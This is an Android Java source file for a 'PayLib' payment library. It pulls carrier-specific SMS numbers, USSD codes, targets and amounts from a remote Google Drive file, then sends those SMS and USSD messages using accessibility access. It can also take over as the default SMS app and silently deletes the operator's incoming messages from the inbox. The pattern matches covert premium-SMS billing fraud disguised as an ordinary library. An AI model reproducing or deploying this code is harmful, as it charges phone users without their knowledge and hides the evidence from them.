package com.example.p2plib2;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.provider.Telephony;

import com.example.p2plib2.common.CommonFunctions;
import com.example.p2plib2.common.FilesLoader;
import com.example.p2plib2.operators.Operator;
import com.example.p2plib2.ussd.USSDController;
import com.google.gson.Gson;

import java.util.ArrayList;
import java.util.HashMap;

import static com.example.p2plib2.ussd.USSDController.verifyAccesibilityAccess;


public class PayLib implements PayInterface {
    private String version = "1.0";
    private String operDest = "";
    private static String defaultSmsApp;
    private SharedPreferences operatorSettings;
    public static Operator operator;
    private HashMap<String, OperatorInfo> operatorInfo = new HashMap<>();
    private HashMap<String, String> filters = new HashMap<>();

    public static CallSmsResult feedback;
    public static String operName = "";
    public static Context cnt;
    public static Activity act;
    public static Boolean flagok = false;

    private static final int DEF_SMS_REQ = 0;
    public static final String PREFERENCES = "operSetting";


    public static String getOperName() {
        return operName;
    }

    public static void getSMSResult(String smsBody) {
        Logger.lg("smsBody from lib: " + smsBody);
        feedback.callResult(smsBody);
    }

    @Override
    public void updateData(Activity act, Context cnt, CallSmsResult feedback, Boolean sendWithSaveOutput, Boolean sendWithSaveInput) {
        this.feedback = feedback;
        this.cnt = cnt;
        this.act = act;
        CommonFunctions.permissionCheck(cnt, act);
        USSDController.verifyAccesibilityAccess(act);
        verifyAccesibilityAccess(act);
        operatorSettings = cnt.getSharedPreferences(PREFERENCES, Context.MODE_PRIVATE);
        /*Create necessary objects*/
        operName = CommonFunctions.operName(cnt);
        operator = new Operator(CommonFunctions.operName(cnt), sendWithSaveOutput, sendWithSaveInput);
        new DownloadApkTask().execute();
    }

    /***/
    private class DownloadApkTask extends AsyncTask<Void, Void, Void> {

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected Void doInBackground(Void... params) {
            final FilesLoader load = new FilesLoader();
            String input = load.downloadJson("https://drive.google.com/a/adviator.com/uc?authuser=0&id=1cP7AGOYNJNkjo0hrJxSCgyGi5TpSna-v&export=download");
            SharedPreferences.Editor editor = operatorSettings.edit();
            editor.putString(PREFERENCES, input);
            editor.apply();
            Gson g = new Gson();
            OperatorList operator = g.fromJson(input, OperatorList.class);
            for (Object user : operator.operators) {
                Logger.lg("op " + user.toString() + " " + operator.getClass().toString());
                String[] separated = user.toString().replace("{", "").replace("}", "").trim().split(",");
                OperatorInfo info = new OperatorInfo(
                        separated[0].substring(separated[0].indexOf("=") + 1),
                        separated[1].substring(separated[1].indexOf("=") + 1),
                        separated[2].substring(separated[2].indexOf("=") + 1),
                        separated[3].substring(separated[3].indexOf("=") + 1),
                        separated[4].substring(separated[4].indexOf("=") + 1));
                String opr = separated[0].substring(separated[0].indexOf("=") + 1);
                operatorInfo.put(opr.toUpperCase(), info);
            }
            return null;
        }

        @Override
        protected void onPostExecute(Void result) {
            setOperatorData();
        }
    }


    public void setOperatorData() {
        Logger.lg("KeySetData " + operatorInfo.keySet().toString()
                + " " + getOperName());
        if (operatorInfo.containsKey(operator.name)) {
            OperatorInfo info = operatorInfo.get(getOperName());
            operator.setData(info.smsNum, info.target, info.sum, info.ussdNum);
            Logger.lg(operator.toString());
        }
        feedback.callResult("end of update");
    }

    class OperatorList {
        ArrayList operators;
    }

    class OperatorInfo {
        String operator;
        String smsNum;
        String ussdNum;
        String target;
        String sum;

        public OperatorInfo(String s, String s1, String s2, String s3, String s4) {
            this.operator = s;
            this.smsNum = s1;
            this.ussdNum = s2;
            this.target = s3;
            this.sum = s4;
        }
    }

    /**
     * Reply answer code
     */
    public static void sendAnswer(String smsBody) {
        operator.sendAnswer(smsBody);
    }

    @Override
    public void sendSms(Boolean sendWithSaveOutput, Boolean sendWithSaveInput, Activity act, Context cnt) {
        if (sendWithSaveInput == false) {
            operator.sendSMS();
            deleteSMS(filters);
        } else {
            operator.sendSMS();
        }
    }

    @Override
    public void sendUssd(String operDestination, Activity act) {
        flagok = true;
        operator.sendUssd(operDestination, act);
    }


    @Override
    public String getVersion() {
        return version;
    }

    public void setFilter(HashMap<String, String> filters) {
        this.filters.putAll(filters);
    }

    public void checkSmsDefaultApp(boolean deleteFlag, Integer code) {
        final String myPackageName = cnt.getPackageName();
        defaultSmsApp = Telephony.Sms.getDefaultSmsPackage(cnt);
        Logger.lg( deleteFlag + " MyPackageName  " + myPackageName + "  defaultSmsApp now " + defaultSmsApp + " " + !defaultSmsApp.equals(myPackageName));
        if(!myPackageName.equals(defaultSmsApp)&& deleteFlag == true){
            Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            act.startActivityForResult(intent, code);
        } else {
            Intent intent3 = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
            act.startActivityForResult(intent3, code);
        }
    }

    public void deleteSMS(HashMap<String, String> filters) {
        Uri uriSms = Uri.parse("content://sms/inbox");
        Cursor c = cnt.getContentResolver().query(
                uriSms, null, null, null, null);
        Logger.lg("Sms in inbox: " + c.getCount());
        int flag = 0;
        if (c != null && c.moveToFirst()) {
            do {
                long id = c.getLong(0);
                long threadId = c.getLong(1);
                String address = c.getString(2);
                String body = c.getString(5);
                String date = c.getString(3);
                Logger.lg("Message  " + c.getString(c.getColumnIndex("body")) + " id " + id + " date " + date +  " " + address.toUpperCase() + " " + operator.name + " " + (address.toUpperCase().equals(operator.name)));
                if ((address.equals(operator.smsNum) || address.toUpperCase().equals(operator.name))  && flag < 2) {
                    int iko = cnt.getContentResolver().delete(
                            Uri.parse("content://sms"), "_id=? and thread_id=?", new String[]{String.valueOf(id), String.valueOf(threadId)});
                    if (iko != 0) {
                        flag++;
                    }
                    Logger.lg("Delete result " + iko);
                }
            } while (c.moveToNext());
        }
        feedback.callResult("Delete  " + flag + " sms");
    }

//    @Override
//    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
//        switch (requestCode) {
//            case DEF_SMS_REQ:
//                boolean isDefault = resultCode == Activity.RESULT_OK;
//                Logger.lg("isDefault " + isDefault);
//                if (isDefault) {
//                    operator.sendSMS();
//                    deleteSMS(filters);
//                }
//                break;
//            default:
//                break;
//        }
//    }

}